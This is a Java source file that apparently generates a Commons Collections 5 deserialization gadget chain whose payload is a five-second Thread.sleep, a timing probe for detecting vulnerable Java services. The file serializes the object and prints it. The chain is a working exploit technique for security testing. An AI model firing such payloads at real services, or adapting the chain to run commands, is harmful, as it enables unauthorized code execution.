package com.kindredgroup.mkallserial.payloads;

import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import java.io.FileOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import javax.management.BadAttributeValueExpException;

import java.io.FileInputStream;
import java.io.File;

public class SleepCommonsCollections5 {
    public static void main(String[] args) throws Exception {
         
        /* Thread.sleep(5000); Serilization gadget chain */

        ConstantTransformer Thread_class = new ConstantTransformer(Thread.class);
        InvokerTransformer getMethod = new InvokerTransformer("getMethod", 
        new Class[]{
            String.class, Class[].class
        }, 
        new Object[]{
            "sleep", new Class[]{Long.TYPE}
        });

        InvokerTransformer invoke = new InvokerTransformer("invoke", 
        new Class[]{
            Object.class, Object[].class
        }, new Object[]
        {
            null, new Object[]{5000L}
        });

        Transformer[] transformers = new Transformer[]{Thread_class, getMethod, invoke};

        
        ChainedTransformer TransformerChain = new ChainedTransformer(transformers);

        Map hashMap = new HashMap();
        Map lazyMap = LazyMap.decorate(hashMap, TransformerChain);

        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap,"c014");
        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException("c014");
        Field valField = badAttributeValueExpException.getClass().getDeclaredField("val");
        valField.setAccessible(true);
        valField.set(badAttributeValueExpException, tiedMapEntry);
        
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("object.cer"));
        oos.writeObject(badAttributeValueExpException);
        oos.close();

        /* To stdout */
        File file = new File("object.cer");

		FileInputStream fis = new FileInputStream(file);
		int oneByte;
		while ((oneByte = fis.read()) != -1) {
			System.out.write(oneByte);
		}
		System.out.flush();        
        fis.close();

        /* Deserialise payload test that it works */
        //ObjectInputStream  in = new ObjectInputStream(new FileInputStream("object.cer"));
        //in.readObject();
        //in.close();

    }   
}
